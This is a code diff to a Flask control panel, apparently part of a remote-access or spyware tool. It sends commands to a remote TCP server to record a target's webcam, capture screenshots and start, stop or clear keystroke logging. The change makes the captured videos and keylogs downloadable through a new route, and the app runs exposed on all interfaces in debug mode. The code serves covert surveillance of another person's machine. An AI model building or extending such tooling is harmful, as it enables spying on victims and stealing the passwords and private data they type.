@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, Response, send_file
+from flask import Flask, render_template, request, jsonify, Response, send_file, send_from_directory
 import socket, json, os, struct, io, time
 from datetime import datetime
 
@@ -69,17 +69,21 @@ def save_screenshot_locally():
 
 def save_video_locally(seconds):
     try:
-        # Send record command, wait for Server, then receive file
+        # Send record command...
         video_data = send_tcp(f"webcam_record {seconds}", binary=True)
-        if not video_data: return "[ERROR] Failed to download video"
-        
+        if not video_data: return {"error": "Failed to download video from TCP server"}
+
         os.makedirs("recordings", exist_ok=True)
-        filename = f"recordings/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
-        
-        with open(filename, "wb") as f:
+        # Chỉ lấy tên file, không lấy đường dẫn tuyệt đối
+        fname = f"video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
+        filepath = os.path.join("recordings", fname)
+
+        with open(filepath, "wb") as f:
             f.write(video_data)
-        return f"Saved to: {os.path.abspath(filename)}"
-    except Exception as e: return f"[ERROR] {e}"
+
+        # Trả về tên file để JS gọi tải về
+        return {"filename": fname} 
+    except Exception as e: return {"error": str(e)}
 
 # --- LOCAL KEYLOG SAVING ---
 @app.route("/api/save_keylog_local", methods=["POST"])
@@ -87,21 +91,18 @@ def save_keylog_local():
     try:
         data = request.json
         content = data.get("content", "")
-        
-        # Create keylog directory if not exists
+
         folder = "keylog"
-        if not os.path.exists(folder):
-            os.makedirs(folder)
-            
-        # Generate filename with timestamp
-        filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
-        filepath = os.path.join(folder, filename)
-        
-        # Write file
+        if not os.path.exists(folder): os.makedirs(folder)
+
+        fname = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+        filepath = os.path.join(folder, fname)
+
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(content)
-            
-        return jsonify({"status": "ok", "message": f"Saved to {filepath}"})
+
+        # Trả về filename
+        return jsonify({"status": "ok", "filename": fname})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
@@ -179,9 +180,13 @@ def control():
     # Handle Webcam Record (Local Save)
     elif act == "webcam_record":
         seconds = d.get("seconds", 5)
-        result = save_video_locally(seconds)
-        return jsonify({"status": "ok" if "[ERROR]" not in result else "error", "message": result})
+        res_data = save_video_locally(seconds) # Hàm này giờ trả về dict
 
+        if "error" in res_data:
+            return jsonify({"status": "error", "message": res_data["error"]})
+        else:
+            # Trả về filename cho Client JS
+            return jsonify({"status": "ok", "download_url": res_data["filename"]})
     # Standard Commands
     map_cmd = {
         "keylog_start": "keylog_start", "keylog_stop": "keylog_stop", "keylog_clear": "keylog_clear",
@@ -202,6 +207,22 @@ def control():
 # --- ROUTES ---
 @app.route("/")
 def index(): return render_template("index.html")
+
+# Route mới để trình duyệt tải file video/keylog từ thư mục của Flask
+@app.route('/download_local/<path:filename>')
+def download_local_file(filename):
+    # Kiểm tra xem file nằm ở thư mục nào
+    if filename.endswith(".mp4"):
+        directory = "recordings"
+    elif filename.endswith(".txt"):
+        directory = "keylog"
+    else:
+        directory = "."
+
+    try:
+        return send_from_directory(directory, filename, as_attachment=True)
+    except FileNotFoundError:
+        return "File not found!", 404
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000, debug=True)
